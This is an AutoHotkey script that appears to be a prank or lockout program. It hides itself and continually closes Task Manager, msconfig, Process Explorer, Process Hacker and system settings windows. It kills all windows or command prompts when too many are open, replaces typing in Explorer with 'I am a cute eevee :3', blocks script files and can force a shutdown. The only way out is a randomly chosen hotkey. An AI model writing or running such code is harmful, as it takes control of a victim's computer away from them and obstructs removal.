#notrayicon
#singleinstance force
#hotkeyinterval 500
#maxhotkeysperinterval 99999
process priority,,r
settitlematchmode 2
text:=strsplit("I am a cute eevee :3 ")
pos:=1
currentwin:=0

groupadd allwindows
groupadd banned,Create Shortcut
groupadd banned,ahk_exe taskmgr.exe
groupadd banned,ahk_exe systempropertiescomputername.exe
groupadd banned,ahk_exe systempropertieshardware.exe
groupadd banned,ahk_exe systempropertiesadvanced.exe
groupadd banned,ahk_exe systempropertiesprotection.exe
groupadd banned,ahk_exe systempropertiesremote.exe
groupadd banned,ahk_exe systempropertiesdataexecutionprevention.exe
groupadd banned,ahk_exe systempropertiesperformance.exe
groupadd banned,ahk_exe msconfig.exe
groupadd banned,ahk_exe Netplwiz.exe
groupadd banned,ahk_exe OptionalFeatures.exe
groupadd banned,ahk_exe colorcpl.exe
groupadd banned,ahk_class ProcessHacker
groupadd banned,ahk_class PROCEXPL
groupadd banned,ahk_class MMCMainFrame

settimer watch,100
mod:=""
mods:=["+","^","!","#"]
if(!random(0,4)){
	max:=4
}else if(!random(0,4)){
	max:=2
}else{
	max:=3
}
loop %max%{
	mod:=mod mods.removeat(random(1,mods.length()))
}
keys:=strsplit("4 5 6 7 8 9 0 a b c d e f g h i j k l m n o p q r s t u v w x y z"," ")
kbd:=keys.removeat(random(1,keys.length()))
h:=[]
loop 4{
	h.push(keys.removeat(random(1,keys.length())))
}
h.insertat(random(1,5),kbd)
hint:=""
loop % h.length(){
	if(a_index=1){
		hint:=h[a_index]
	}else{
		hint:=hint " " h[a_index]
	}
}
key:=mod kbd
hotkey if
hotkey %key%,logout

hotkey ifwinactive,ahk_exe explorer.exe
loop 91{
	try{
		ch:=chr(a_index+31)
		stringlower ch,ch
		hotkey %ch%,keys
		hotkey +%ch%,keys
	}catch{}
}
hotkey ifwinactive,Open ahk_class #32770
loop 91{
	try{
		ch:=chr(a_index+31)
		stringlower ch,ch
		hotkey %ch%,keys
		hotkey +%ch%,keys
	}catch{}
}
hotkey ifwinactive,Save As ahk_class #32770
loop 91{
	try{
		ch:=chr(a_index+31)
		stringlower ch,ch
		hotkey %ch%,keys
		hotkey +%ch%,keys
	}catch{}
}
hotkey if

return

:*?:task::
	if(a_priorhotkey=":*?:kill"){
		loop 4{
			send {backspace}
		}
		send killtask
	}else{
		send kill
	}
return

:*?:kill::
	send task
return
:*?::bat::tab
:*?::cmd::dmc

*enter::
	send {blind}{enter}
	keywait enter
return

*#e::
	if(winexist("ahk_class CabinetWClass")){
		winactivate ahk_class CabinetWClass
	}else{
		run C:\Windows\explorer.exe
	}
return

*#1::
*#2::
*#3::
*#4::
*#5::
*#6::
*#7::
*#8::
*#9::
*#0::
return

*mbutton::
	coordmode mouse,screen
	mousegetpos,,y
	if(a_screenheight-y>100){
		click down m
		keywait mbutton
		click up m
	}
return

logout(){
	global
	msgbox It was %key%
	exitapp
}

watch(){
	global
	winclose ahk_group banned
	winget windows,count,ahk_group allwindows
	if(windows>50){
		winkill ahk_group allwindows
	}
	winkill EasyBCD,,,Uninstall
	winget windows,list,ahk_exe explorer.exe
	loop %windows%{
		id:=windows%a_index%
		controlgettext address,ToolbarWindow322,ahk_id %id%
		if(instr(address,"Address: C:\Windows")||instr(address,"Address: Control Panel\")&&(instr(address,"\User Accounts")||instr(address,"\Parental Controls")||instr(address,"\Fonts")||instr(address,"\Windows Update"))){
			winclose ahk_id %id%
		}
	}
	winget windows,list,ahk_class #32770
	loop %windows%{
		id:=windows%a_index%
		controlgettext address,ToolbarWindow323,ahk_id %id%
		if(instr(address,"Address: C:\Windows")||instr(address,"Address: Control Panel\")&&(instr(address,"\User Accounts")||instr(address,"\Parental Controls")||instr(address,"\Fonts")||instr(address,"\Windows Update"))){
			winclose ahk_id %id%
		}
	}
	winget windows,count,ahk_exe cmd.exe
	if(windows>9){
		run C:\Windows\System32\taskkill.exe /f /im cmd.exe,,hide
		run C:\Windows\System32\taskkill.exe /f /im conhost.exe,,hide
		run C:\Windows\System32\taskkill.exe /f /im ntvdm.exe,,hide
	}
	newwin:=winexist("a")
	if(currentwin!=newwin){
		pos:=1
		currentwin:=newwin
	}
	controlgetfocus ctrl,a
	if(ctrl="Edit1"&&(winactive("ahk_class Progman")||winactive("ahk_class #32770"))||ctrl="Edit2"&&winactive("ahk_class CabinetWClass")){
		controlgettext ctrltext,%ctrl%,a
		if(instr(ctrltext,".bat")||instr(ctrltext,".cmd")||instr(ctrltext,".js")||instr(ctrltext,".vb")||instr(ctrltext,".hta")||instr(ctrltext,".htmla")){
			send {esc}
		}
	}
	if(winactive("ahk_class Notepad")){
		if(winactive(".bat -")||winactive(".cmd -")||winactive(".js -")||winactive(".jse -")||winactive(".vb -")||winactive(".vbs -")||winactive(".hta -")||winactive(".htmla -")){
			winkill a
		}
	}
	process exist,explorer.exe
	if(!errorlevel){
		if(fileexist("C:\Windows\explorer.exe")){
			run C:\Windows\explorer.exe
		}else{
			shutdown 5
			exitapp
		}
	}
}

keys(){
	global
	controlgetfocus ctrl,a
	if(ctrl="DirectUIHWND1"||ctrl="DirectUIHWND2"&&winactive("ahk_class DV2ControlHost")||ctrl="Edit1"&&(winactive("ahk_class CabinetWClass")||winactive("ahk_class Shell_TrayWnd"))||winactive("ahk_class #32770")&&ctrl="Edit2"){
		if(a_thishotkey="*enter"){
			send {esc}
		}else if(a_thishotkey="*^v"){
			clipboard:="I am a cute eevee :3 "
			send ^{v}
		}else{
			char:=text[pos]
			send %char%
			pos:=mod(pos,text.length())+1
		}
	}else if(!(ctrl="Edit2"&&(a_thishotkey="*^v"||a_thishotkey="*appskey"||a_thishotkey="*+f10")&&winactive("ahk_class CabinetWClass"))){
		unblock()
	}
	noplus:=regexreplace(a_thishotkey,"^[\*\+\^]+")
	keywait %noplus%
}

ctrlclick(ctrl,win){
	coordmode mouse,window
	mousegetpos x,y
	controlgetpos l,t,w,h,%ctrl%,%win%
	if(x+5>l&&x-5<l+w&&y+5>t&&y-5<t+h){
		return 1
	}
}

unblock(){
	noplus:=regexreplace(a_thishotkey,"^[\*\+\^]+")
	if(noplus=" "){
		noplus:="space"
	}
	regexmatch(a_thishotkey,"^\*?([\+\^]+).*",yesplus)
	send %yesplus1%{%noplus%}
}

random(min,max){
	random out,min,max
	return out
}

#ifwinactive ahk_class Notepad
+!f11::
	keywait f11
	sendraw %hint%
return

#ifwinactive ahk_exe explorer.exe ahk_class #32770
*enter::
*!a::
*tab::
	controlget ctrl,hwnd,,SysTabControl321,a
	if(ctrl){
		send {esc}
	}else{
		controlgettext button,Static2
		if(instr(button,"Type the name of a program")){
			send {esc}
		}else{
			unblock()
		}
	}
return

*lbutton::
	controlget ctrl,hwnd,,SysTabControl321,a
	if(ctrl){
		mousegetpos,,,,ctrl
		controlgettext button,%ctrl%
		if(button="OK"||button="&Apply"){
			send {esc}
			return
		}
	}else{
		controlgettext button,Static2
		if(instr(button,"Type the name of a program")&&ctrlclick("Button2","a")){
			send {esc}
			return
		}
	}
	click down
	keywait lbutton
	click up
return

#ifwinexist ahk_exe explorer.exe ahk_class #32770
*lbutton::
	if(winactive("ahk_exe explorer.exe ahk_class #32770")){
		controlget ctrl,hwnd,,SysTabControl321,a
		if(ctrl){
			mousegetpos,,,,ctrl
			controlgettext button,%ctrl%
			if(button="OK"||button="&Apply"){
				send {esc}
				return
			}
		}else{
			controlgettext button,Static2
			if(instr(button,"Type the name of a program")&&ctrlclick("Button2","a")){
				send {esc}
				return
			}
		}
	}
	click down
	keywait lbutton
	click up
return

#ifwinactive ahk_class CabinetWClass
*lbutton::
	if(!ctrlclick("ToolbarWindow323","a")){
		click down
		keywait rbutton
		click up
	}
return

#if winactive("ahk_exe explorer.exe")||winactive("ahk_class Open ahk_class #32770")||winactive("ahk_class Save As ahk_class #32770")
*^a::
*^v::
*enter::
*backspace::
*del::
*appskey::
*+f10::
	keys()
return

*rbutton::
	if(!ctrlclick("DirectUIHWND1","a")&&!ctrlclick("Edit1","a")&&!ctrlclick("Edit2","a")){
		if(!(ctrlclick("DirectUIHWND2","a")&&winactive("ahk_class DV2ControlHost"))){
			click down r
			keywait rbutton
			click up r
		}
	}
return

#ifwinactive ahk_class ConsoleWindowClass
*rbutton up::
	send {esc down}{rbutton up}{esc up}
return

*enter::
	keywait enter
	send {ctrl down}{ctrlbreak}{ctrl up}
return

*^m::
	keywait m
	send {ctrl down}{ctrlbreak}{ctrl up}
return

#ifwinexist ahk_class ConsoleWindowClass
*rbutton::
	mousegetpos,,,id
	if(!winexist("ahk_class ConsoleWindowClass ahk_id " id)){
		click down r
		keywait rbutton
		if(winactive("ahk_class ConsoleWindowClass")){
			send {esc down}{rbutton up}{esc up}
		}else{
			click up r
		}
	}
return

~*lbutton::
	if(winactive("ahk_class ConsoleWindowClass")){
		click up
		send {alt}
	}
return